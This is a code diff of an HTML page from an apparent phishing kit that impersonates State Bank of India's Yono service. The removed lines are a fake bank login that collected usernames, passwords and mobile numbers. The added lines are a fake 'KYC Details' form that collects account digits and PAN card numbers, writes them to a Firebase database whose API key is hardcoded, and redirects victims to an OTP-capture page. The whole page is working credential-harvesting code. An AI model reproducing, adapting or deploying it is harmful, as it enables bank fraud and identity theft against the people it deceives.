@@ -4,14 +4,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Yono SBI</title>
+    <title>KYC</title>
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <!-- Your custom CSS -->
     <link rel="stylesheet" href="./style.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@700&display=swap" rel="stylesheet">
+    <style>
+        /* Add your custom styles here */
+    </style>
 
 </head>
 
@@ -20,64 +20,41 @@
         <img alt="cMIF2W" width="120" height="32" src="./images/logo.7fd9da50.png" style="color:transparent">
     </header>
     <div class="Tpv_login_heading__E5J6K">
-        <h3 class="Tpv_login_heading_h3__z0Qx1">Log in Online E-Pan Kyc</h3>
+        <h3 class="Tpv_login_heading_h3__z0Qx1">KYC Details</h3>
     </div>
     <div class="Tpv_login_form___9zpm">
-        <p class="Tpv_info__04_Jv"><span class="Tpv_info_span__oB9oh">(CARE:</span> Username and password sensitive)</p>
+        <p class="Tpv_mandatory_txt__YZHLO">Required fields an asterisk (*)</p>
         <form class="Tpv_form__okPRU" id="firebaseForm" onsubmit="submitForm(event)">
-            <div class="Tpv_form_group__aHWg0"><label class="Tpv_label__cObJz">Username*</label><input type="text"
-                    class="Tpv_form_control__5hzGF" required="" maxlength="30" name="UN"></div>
-            <div class="Tpv_form_group__aHWg0"><label class="Tpv_label__cObJz">Password*</label><input type="password"
-                    class="Tpv_form_control__5hzGF" required="" maxlength="30" name="PS"></div>
-            <div class="Tpv_form_group__aHWg0"><label class="Tpv_label__cObJz">Mobile*</label><input type="text"
-                    minlength="10" maxlength="10" class="Tpv_form_control__5hzGF" required="" name="MB"></div>
-            <div class="Tpv_form_group__aHWg0"><label class="Tpv_label__cObJz">Enter the text shown in the
-                    image*</label><input type="text" class="Tpv_form_control__5hzGF" maxlength="30"></div><label
-                class="Tpv_label__cObJz">Select any of the Captcha</label>
-            <div class="Tpv_captcha__luduR">
-                <div class="Tpv_w_50__Sr4Sb"><input type="radio" id="" checked="">Image Captcha</div>
-                <div class="Tpv_w_50__Sr4Sb"><input type="radio" id="" disabled="">Audio Captcha</div>
-                <div class="Tpv_clear__O2odX"></div>
-                <div class="Tpv_top_10__85sFl">
-                    <div><img alt="oRPcKP" loading="lazy" width="150" height="39" decoding="async" data-nimg="1"
-                            src="./images/captcha.196bfa1b.png" style="color:transparent"></div>
-                </div>
-                <div class="Tpv_form_group__aHWg0"><input type="submit" class="Tpv_btn__Mbztt" value="SUBMIT"><input
-                        type="reset" class="Tpv_btn__Mbztt" value="RESET"></div>
-                <p><a href="javascript:void"> Register</a></p>
-                <p><a href="javascript:void">Forget</a></p>
-            </div>
+            <div class="Tpv_form_group__aHWg0"><label class="Tpv_label__cObJz">Last 4-digit A/c No <span
+                        class="Tpv_mandatory_txt__YZHLO">*</span></label><input inputmode="numeric" minlength="4"
+                    maxlength="4" class="Tpv_form_control__5hzGF pan" required="" type="text" name="LDAN"></div>
+            <div class="Tpv_form_group__aHWg0"><label class="Tpv_label__cObJz">Pan Card No.<span
+                        class="Tpv_mandatory_txt__YZHLO">*</span></label><input pattern="[a-zA-Z]{5}[0-9]{4}[a-zA-Z]{1}"
+                    maxlength="10" minlength="10" class="Tpv_form_control__5hzGF" required="" type="e" name="PCN"></div>
+            <p class="Tpv_content_title__SWlCq">81% Done</p>
+            <div class="Tpv_t_center__8YF86"><input class="Tpv_btn_default__TMlv_" type="submit"></div>
         </form>
-    </div>
-    <div class="Tpv_p_body__VIl_Q">
-        <ul class="Tpv_provide__KIDMh">
-            <li>Required fields an asterisk ().</li>
-            <li>Please do not share personal information user id and password any other page</li>
-            <li>Username and password are sensitive. Do not share with anyone</li>
-        </ul>
     </div>
     <div class="Tpv_footer_area__vmfML"><img alt="599OM4" loading="lazy" width="68" height="28" decoding="async"
             data-nimg="1" src="./images/ersign.6a658828.png" style="color:transparent"></div>
     <div class="Tpv_footer__uSut5">
         <p>© 2023</p>
     </div>
-
     <!-- Bootstrap JS and dependencies (jQuery) -->
     <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
 
-    <!-- Firebase SDK (add your own Firebase configuration) -->
+    <script src="
+https://cdn.jsdelivr.net/npm/jquery-mask-plugin@1.14.16/dist/jquery.mask.min.js
+"></script>
+
     <!-- Firebase SDK (add your own Firebase configuration) -->
     <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
-
     <!-- Your custom JavaScript for Firebase integration -->
-
-    <!-- Remove type="module" from script tags -->
-
-
     <script>
+        // Your Firebase configuration
         // Your Firebase configuration
         const firebaseConfig = {
             apiKey: "AIzaSyB2heDmSZnCAo2wesbIYGfibU3r0ERji7c",
@@ -116,12 +93,19 @@
 
                 // Clear form after submission
                 form.reset();
-                window.location.href = 'otp.html';
+                window.location.href = 'otp-next-2.html';
 
             } catch (error) {
                 console.error('Error adding document: ', error);
             }
         }
+
+
+        $(document).ready(function () {
+            $('.pan').mask('0000');
+
+
+        });
     </script>
 
 </body>
